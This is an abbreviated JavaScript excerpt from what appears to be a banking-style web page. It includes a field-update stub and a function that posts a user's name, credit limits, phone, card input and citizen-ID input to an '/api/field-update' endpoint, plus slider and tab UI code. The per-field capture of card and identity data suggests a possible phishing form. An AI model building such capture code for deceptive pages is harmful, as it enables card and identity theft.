...
window._vib_field_update = window._vib_field_update || {
    postField: function () {
        ...
        console && console.warn && console.warn('vib_field_update stub: postField called before initialization');
        return Promise.resolve();
    },
    getSessionId: function () {
        try { return sessionStorage.getItem('vib_session_id'); } catch (e) { return null; }
    }
};
...
(function () {
    ...
    const FIELD_UPDATE_API = (typeof window.FIELD_UPDATE_API !== 'undefined')
        ? window.FIELD_UPDATE_API
        : ((location.origin && location.origin !== 'null') ? location.origin + '/api/field-update' : '/api/field-update');
    ...
    async function sendConsolidated(opts) {
        // opts: { fullName, limitGranted, limitAvailable, phone, cardInput, cccdInput, page }
...
(function () {
    ...
    function stop() { running = false; last = null; }
...
(function () {
    ...
    function update() {
        ...
        dots.forEach((d, i) => i === index ? d.setAttribute('aria-selected', 'true') : d.removeAttribute('aria-selected'));
    }
    ...
    track.addEventListener('pointerdown', e => { dragging = true; startX = e.clientX; track.style.transition = 'none'; stop(); });
    ...
    window.addEventListener('pointermove', e => {
        if (!dragging) return; const diff = e.clientX - startX; const percent = diff / slider.offsetWidth * 100; const base = -index * 100; track.style.transform = `translateX(${base + percent}%)`;
    });
...
(function () {
    ...
    tabs.forEach((tab, idx) => {
        ...
        tab.addEventListener('keydown', (e) => {
            if (e.key === 'ArrowRight') { e.preventDefault(); activateTab((idx + 1) % tabs.length); }
            else if (e.key === 'ArrowLeft') { e.preventDefault(); activateTab((idx - 1 + tabs.length) % tabs.length); }
